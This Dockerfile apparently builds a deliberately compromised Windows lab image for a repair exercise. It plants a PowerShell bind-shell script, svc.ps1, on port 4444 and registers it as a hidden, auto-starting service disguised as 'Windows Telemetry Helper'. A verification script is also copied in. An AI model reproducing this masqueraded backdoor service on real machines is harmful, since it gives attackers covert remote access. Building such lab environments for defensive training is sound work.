# syntax=docker/dockerfile:1
# meta3-win-19-rogue-listener-service — Windows service spawning a PowerShell bind shell on 4444/TCP
FROM sysrepair/meta3-win-base:ltsc2019

SHELL ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "$ErrorActionPreference='Stop';"]

# Plant a PowerShell bind-shell script and register a service that launches it as
# LocalSystem. The script listens on 4444/TCP and pipes stdin/stdout of cmd.exe to
# the socket — a classic backdoor listener.
RUN New-Item -ItemType Directory -Path C:\ProgramData\WinTelemetry -Force | Out-Null
COPY svc.ps1 C:/ProgramData/WinTelemetry/svc.ps1
RUN New-Service -Name 'WinTelemetrySvc' -DisplayName 'Windows Telemetry Helper' -BinaryPathName 'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\WinTelemetry\svc.ps1' -StartupType Automatic
# Firewall is disabled in the base image; no explicit allow rule required.

COPY verify.ps1 C:/verify/verify.ps1

EXPOSE 4444 22 5985
CMD ["powershell", "-NoProfile", "-Command", "Start-Service sshd; Start-Service WinRM; Start-Service WinTelemetrySvc -ErrorAction SilentlyContinue; while ($true) { Start-Sleep 60 }"]
